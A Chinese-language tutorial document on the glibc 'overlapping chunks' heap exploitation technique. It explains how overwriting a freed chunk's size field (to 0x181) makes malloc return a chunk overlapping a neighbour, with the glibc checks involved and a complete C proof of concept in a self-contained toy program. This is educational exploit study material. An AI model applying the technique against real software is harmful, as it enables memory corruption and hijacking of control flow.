# 漏洞利用文档：Overlapping Chunks

## 攻击对象
堆内存中的chunk p2的size字段（具体位置为p2的chunk头中的size位，地址`p2-1`）。通过修改已释放chunk的size元数据，欺骗malloc分配机制，导致内存重叠。攻击涉及unsorted bin的管理和chunk的元数据完整性。

## 利用过程
1. **分配初始chunks**：连续分配三个chunk（p1、p2、p3），大小分别为0xf8、0xf8和0x78字节用户数据。
2. **释放p2**：释放p2，使其进入unsorted bin，为后续利用做准备。
3. **覆盖size字段**：通过堆溢出漏洞，覆盖p2的size字段从0x101改为0x181（保持prev_inuse位为1以避免检查）。
4. **分配重叠chunk**：分配一个新chunk p4，大小匹配修改后的size（0x178字节用户数据），malloc从unsorted bin中取出被修改的p2 chunk，导致p4分配并扩展覆盖p3的内存区域。
5. **验证重叠**：通过数据写入演示p4和p3的内存重叠，实现对同一内存区域的相互影响。

## 利用条件
- **堆溢出写**：存在堆溢出漏洞，允许写入相邻chunk的元数据（如size字段）。在本例中，通过`*(p2-1) = evil_chunk_size`模拟溢出。
- **控制溢出内容**：能精确控制溢出数据，修改size字段并维持prev_inuse位设置，以绕过Glibc的堆元数据检查。
- **malloc/free操作**：程序涉及malloc和free操作，且释放的chunk进入unsorted bin，便于重用。
- **内存布局**：chunks在内存中连续分配，确保溢出能精准影响目标chunk。

## 利用效果
- **内存重叠**：造成p4和p3的内存区域重叠，实现Use-After-Free（UAF）或类型混淆。
- **任意数据读写**：通过对p4或p3的写入，可相互覆盖数据，潜在用于信息泄露（如读取敏感指针）或数据污染。
- **控制流劫持**：如果重叠区域包含函数指针或关键数据结构（如vtables），可修改控制流，执行任意代码。
- **双向影响**：演示了数据污染的双向性（对p4写入影响p3，对p3写入影响p4）。

## 涉及缓解机制
Glibc在堆管理中进行元数据完整性检查，以下为相关源码或伪代码摘要。本利用通过精心设置size字段绕过这些检查：

- **malloc从unsorted bin分配时的size检查**（在`malloc.c`的`_int_malloc`函数中）：
  ```c
  while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av)) {
    size = chunksize (victim); // 获取chunk大小
    if (size >= nb) { // 检查大小是否匹配请求
      // ... 分配逻辑
    }
  }
  ```
  本利用中，修改size为0x181，匹配malloc请求的0x178字节（用户数据），绕过检查。

- **free时的chunk合并检查**（在`malloc.c`的`_int_free`函数中）：
  ```c
  if (prev_inuse(p)) { // 检查前一个chunk是否在使用中
    // 不合并
  } else {
    unlink(av, p, bck, fwd); // 触发unlink检查
  }
  ```
  本利用中，通过设置prev_inuse位为1，避免p1被误认为free chunk，从而防止unlink操作。

- **unlink宏的安全检查**（防止双向链表破坏）：
  ```c
  #define unlink(AV, P, BK, FD) { \
    FD = P->fd; \
    BK = P->bk; \
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0)) \
      malloc_printerr ("corrupted double-linked list"); \
    // ... \
  }
  ```
  本利用未直接触发unlink，因此不适用，但通过维护元数据一致性避免错误。

## Proof of Concept
以下为漏洞利用原型源码，添加中文注释以解释关键步骤：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

int main(int argc , char* argv[]){
    intptr_t *p1,*p2,*p3,*p4;

    fprintf(stderr, "\nThis is a simple chunks overlapping problem\n\n");
    fprintf(stderr, "Let's start to allocate 3 chunks on the heap\n");

    p1 = malloc(0x100 - 8); // 分配第一个chunk p1，用户数据大小0xf8字节
    p2 = malloc(0x100 - 8); // 分配第二个chunk p2，用户数据大小0xf8字节
    p3 = malloc(0x80 - 8);  // 分配第三个chunk p3，用户数据大小0x78字节

    fprintf(stderr, "The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n", p1, p2, p3);

    memset(p1, '1', 0x100 - 8); // 填充p1为字符'1'，初始化数据
    memset(p2, '2', 0x100 - 8); // 填充p2为字符'2'
    memset(p3, '3', 0x80 - 8);  // 填充p3为字符'3'

    fprintf(stderr, "\nNow let's free the chunk p2\n");
    free(p2); // 释放p2，p2进入unsorted bin，为后续溢出和重用做准备
    fprintf(stderr, "The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n");

    fprintf(stderr, "Now let's simulate an overflow that can overwrite the size of the\nchunk freed p2.\n");
    fprintf(stderr, "For a toy program, the value of the last 3 bits is unimportant;"
        " however, it is best to maintain the stability of the heap.\n");
    fprintf(stderr, "To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse),"
        " to assure that p1 is not mistaken for a free chunk.\n");

    int evil_chunk_size = 0x181; // 恶意的chunk size值（包括元数据），0x181设置prev_inuse位为1
    int evil_region_size = 0x180 - 8; // 对应的用户数据大小：0x178字节（376字节）
    fprintf(stderr, "We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n",
         evil_chunk_size, evil_region_size);

    *(p2-1) = evil_chunk_size; // 关键步骤：通过堆溢出覆盖p2的size字段。p2-1指向chunk头中的size位。

    fprintf(stderr, "\nNow let's allocate another chunk with a size equal to the data\n"
           "size of the chunk p2 injected size\n");
    fprintf(stderr, "This malloc will be served from the previously freed chunk that\n"
           "is parked in the unsorted bin which size has been modified by us\n");
    p4 = malloc(evil_region_size); // 分配p4，malloc从unsorted bin中取用被修改size的p2 chunk，导致p4大小扩展，重叠p3

    fprintf(stderr, "\np4 has been allocated at %p and ends at %p\n", (char *)p4, (char *)p4+evil_region_size);
    fprintf(stderr, "p3 starts at %p and ends at %p\n", (char *)p3, (char *)p3+0x80-8);
    fprintf(stderr, "p4 should overlap with p3, in this case p4 includes all p3.\n");

    fprintf(stderr, "\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,"
        " and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n");

    fprintf(stderr, "Let's run through an example. Right now, we have:\n");
    fprintf(stderr, "p4 = %s\n", (char *)p4);
    fprintf(stderr, "p3 = %s\n", (char *)p3);

    fprintf(stderr, "\nIf we memset(p4, '4', %d), we have:\n", evil_region_size);
    memset(p4, '4', evil_region_size); // 填充p4为字符'4'，由于重叠，这会覆盖p3的数据
    fprintf(stderr, "p4 = %s\n", (char *)p4);
    fprintf(stderr, "p3 = %s\n", (char *)p3);

    fprintf(stderr, "\nAnd if we then memset(p3, '3', 80), we have:\n");
    memset(p3, '3', 80); // 填充p3为字符'3'，由于重叠，这会部分覆盖p4的数据，演示双向影响
    fprintf(stderr, "p4 = %s\n", (char *)p4);
    fprintf(stderr, "p3 = %s\n", (char *)p3);
}
```

此PoC演示了overlapping chunks的完整利用链，通过调试记录验证了内存重叠和数据污染效果。在实际漏洞利用中，可进一步扩展以实现任意地址读写或控制流劫持。